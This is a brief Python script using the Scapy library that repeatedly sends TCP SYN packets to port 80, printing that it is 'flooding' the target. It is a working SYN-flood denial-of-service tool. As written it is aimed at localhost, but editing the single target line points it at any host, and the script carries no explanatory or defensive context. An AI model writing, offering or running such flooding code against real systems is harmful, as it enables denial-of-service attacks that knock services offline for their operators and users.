from scapy.all import *
import time

target = "127.0.0.1"
packet = IP(dst=target)/TCP(dport=80, flags="S")

print(f"🌊 Flooding {target}... Press CTRL+C to stop.")

while True:
    send(packet, verbose=0)
    time.sleep(0.001)
